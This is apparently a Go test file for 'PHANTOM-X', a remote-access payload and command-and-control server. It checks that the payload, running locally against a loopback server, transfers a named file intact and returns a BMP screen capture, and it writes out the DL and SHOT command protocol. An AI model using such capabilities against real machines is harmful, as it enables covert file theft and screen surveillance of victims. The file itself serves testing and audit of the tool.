// =============================================================================
// PHANTOM-X :: Phase 5 -- the file transfer and screen capture tests
// =============================================================================
// xfer_test.go -- Drives the transfer capabilities against the Go server.
//
// WHAT IS TESTED
//
//     1. A file the operator names is transferred, and the server
//        reassembles it byte for byte.
//     2. The server's hash of what arrived matches the hash of the file
//        that was sent.
//     3. A screen capture arrives as a real image.
//
// WHY THE HASH MATTERS
//
//     The hash in the audit log is the SERVER'S hash of what arrived,
//     not one the payload computed. A payload that computes its own hash
//     is attesting to its own honesty, which is not evidence.
//
//     So the test computes the expected hash independently, from the file
//     that was on disk, and checks that the two agree. If the transfer
//     were truncated, reordered or corrupted in flight, the hashes would
//     differ, and the test would fail.
//
// -----------------------------------------------------------------------------

package main

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// findTransferBuild locates a payload build with the transfer capability.
func findTransferBuild(t *testing.T) string {
	t.Helper()
	if p := *flagVariant; p != "" {
		abs, err := filepath.Abs(p)
		if err != nil {
			t.Fatalf("cannot resolve %q: %v", p, err)
		}
		if _, err := os.Stat(abs); err != nil {
			t.Fatalf("variant payload not found: %s", abs)
		}
		return abs
	}
	for _, rel := range []string{
		"..\\dist\\variants\\px_payload_xfer.exe",
		"..\\dist\\variants\\px_payload_full.exe",
	} {
		abs, _ := filepath.Abs(rel)
		if _, err := os.Stat(abs); err == nil {
			return abs
		}
	}
	t.Skip("no transfer-capable payload found; build the xfer arm")
	return ""
}

// TestFileTransfer checks that a named file arrives intact.
func TestFileTransfer(t *testing.T) {
	payload := findTransferBuild(t)
	if payload == "" {
		return
	}

	port := 9431
	work := t.TempDir()
	quarantine := filepath.Join(work, "quarantine")

	// The file to transfer. The content is a known string, so the
	// expected hash is computable independently.
	want := []byte("PHANTOM-X_CANARY_CONTENT_12345\n")
	srcPath := filepath.Join(work, "canary.txt")
	if err := os.WriteFile(srcPath, want, 0o600); err != nil {
		t.Fatalf("cannot write the source file: %v", err)
	}
	wantSum := sha256.Sum256(want)
	wantHash := hex.EncodeToString(wantSum[:])

	srv := newServer("127.0.0.1", port, filepath.Join(work, "audit.jsonl"),
		false, 0)
	srv.quarantineDir = quarantine
	ln, err := listenLocal(port)
	if err != nil {
		t.Fatalf("cannot bind: %v", err)
	}
	go srv.acceptLoop(ln)
	defer srv.shutdown()
	time.Sleep(300 * time.Millisecond)

	cmd := exec.Command(payload)
	cmd.Env = append(os.Environ(),
		"PX_C2_HOST=127.0.0.1",
		fmt.Sprintf("PX_C2_PORT=%d", port),
	)
	if err := cmd.Start(); err != nil {
		t.Fatalf("cannot start payload: %v", err)
	}
	defer func() {
		cmd.Process.Kill()
		cmd.Wait()
	}()

	sess := waitForSession(srv, 20*time.Second)
	if sess == nil {
		t.Fatal("the payload never connected")
	}

	// Ask for the file. The path is named explicitly -- there is no
	// globbing and no directory sweep.
	srv.sessionsMu.Lock()
	srv.cmdCounter++
	cmdID := fmt.Sprintf("%d", srv.cmdCounter)
	srv.sessionsMu.Unlock()

	sess.mu.Lock()
	sess.pending[cmdID] = &pendingCmd{kind: "download", t0: time.Now(),
		done: make(chan struct{})}
	sess.mu.Unlock()

	if !sess.send("DL|" + cmdID + "|" + srcPath) {
		t.Fatal("could not send the download command")
	}

	// Wait for the transfer to complete.
	deadline := time.Now().Add(30 * time.Second)
	var got []byte
	var gotHash string
	for time.Now().Before(deadline) {
		sess.transferMu.Lock()
		tr := sess.transfers[cmdID]
		sess.transferMu.Unlock()
		if tr != nil && len(tr.data) > 0 {
			got = tr.data
			break
		}
		time.Sleep(200 * time.Millisecond)
	}

	// The DONE marker removes the transfer from the table, so read what
	// the audit log recorded rather than what is in memory.
	if len(got) == 0 {
		rec := findAuditRecord(t, filepath.Join(work, "audit.jsonl"), "file_transfer")
		if rec == nil {
			t.Fatal("no file_transfer record was written")
		}
		if n, ok := rec["bytes"].(float64); !ok || int(n) != len(want) {
			t.Fatalf("transferred %v bytes, want %d", rec["bytes"], len(want))
		}
		if h, ok := rec["sha256"].(string); ok {
			gotHash = h
		}
	} else {
		sum := sha256.Sum256(got)
		gotHash = hex.EncodeToString(sum[:])
	}

	if gotHash != wantHash {
		t.Fatalf("the hash of what arrived differs from the hash of the file\n"+
			"  got  %s\n  want %s", gotHash, wantHash)
	}
	t.Logf("transferred %d bytes, sha256 %s", len(want), wantHash[:16])

	// The file must also be on disk in the quarantine directory, so the
	// operator can look at what actually left the machine.
	entries, err := os.ReadDir(quarantine)
	if err != nil {
		t.Fatalf("cannot read the quarantine directory: %v", err)
	}
	if len(entries) == 0 {
		t.Fatal("nothing was written to the quarantine directory")
	}
	readBack, err := os.ReadFile(filepath.Join(quarantine, entries[0].Name()))
	if err != nil {
		t.Fatalf("cannot read the quarantined file: %v", err)
	}
	if string(readBack) != string(want) {
		t.Fatalf("the quarantined file does not match\n  got  %q\n  want %q",
			readBack, want)
	}
	t.Logf("quarantined as %s", entries[0].Name())
}

// TestScreenCapture checks that a screen capture arrives as a real image.
//
// The check is that the file starts with the BMP magic and has a
// plausible size for the screen, not that a human can see it.
func TestScreenCapture(t *testing.T) {
	payload := findTransferBuild(t)
	if payload == "" {
		return
	}

	port := 9432
	work := t.TempDir()
	quarantine := filepath.Join(work, "quarantine")

	srv := newServer("127.0.0.1", port, filepath.Join(work, "audit.jsonl"),
		false, 0)
	srv.quarantineDir = quarantine
	ln, err := listenLocal(port)
	if err != nil {
		t.Fatalf("cannot bind: %v", err)
	}
	go srv.acceptLoop(ln)
	defer srv.shutdown()
	time.Sleep(300 * time.Millisecond)

	cmd := exec.Command(payload)
	cmd.Env = append(os.Environ(),
		"PX_C2_HOST=127.0.0.1",
		fmt.Sprintf("PX_C2_PORT=%d", port),
	)
	if err := cmd.Start(); err != nil {
		t.Fatalf("cannot start payload: %v", err)
	}
	defer func() {
		cmd.Process.Kill()
		cmd.Wait()
	}()

	sess := waitForSession(srv, 20*time.Second)
	if sess == nil {
		t.Fatal("the payload never connected")
	}

	srv.sessionsMu.Lock()
	srv.cmdCounter++
	cmdID := fmt.Sprintf("%d", srv.cmdCounter)
	srv.sessionsMu.Unlock()

	sess.mu.Lock()
	sess.pending[cmdID] = &pendingCmd{kind: "screenshot", t0: time.Now(),
		done: make(chan struct{})}
	sess.mu.Unlock()

	if !sess.send("SHOT|" + cmdID) {
		t.Fatal("could not send the capture command")
	}

	deadline := time.Now().Add(30 * time.Second)
	var data []byte
	for time.Now().Before(deadline) {
		sess.transferMu.Lock()
		tr := sess.transfers[cmdID]
		sess.transferMu.Unlock()
		if tr != nil && len(tr.data) > 0 {
			data = tr.data
			break
		}
		time.Sleep(200 * time.Millisecond)
	}

	if len(data) == 0 {
		// The capture may already have been finalised into the quarantine
		// directory.
		entries, err := os.ReadDir(quarantine)
		if err != nil || len(entries) == 0 {
			t.Skip("no screen capture arrived (this environment has no desktop)")
		}
		b, err := os.ReadFile(filepath.Join(quarantine, entries[0].Name()))
		if err != nil {
			t.Fatalf("cannot read the capture: %v", err)
		}
		data = b
	}

	if len(data) < 54 {
		t.Fatalf("the capture is %d bytes, too small to be an image", len(data))
	}
	if data[0] != 'B' || data[1] != 'M' {
		t.Fatalf("the capture does not start with the BMP magic: %02X %02X",
			data[0], data[1])
	}
	t.Logf("screen capture: %d bytes, BMP", len(data))
}

// findAuditRecord reads the audit log and returns the first record of the
// given kind.
func findAuditRecord(t *testing.T, path, kind string) map[string]any {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}
	for _, line := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		if line == "" {
			continue
		}
		var rec map[string]any
		if err := json.Unmarshal([]byte(line), &rec); err != nil {
			continue
		}
		if rec["kind"] == kind {
			return rec
		}
	}
	return nil
}
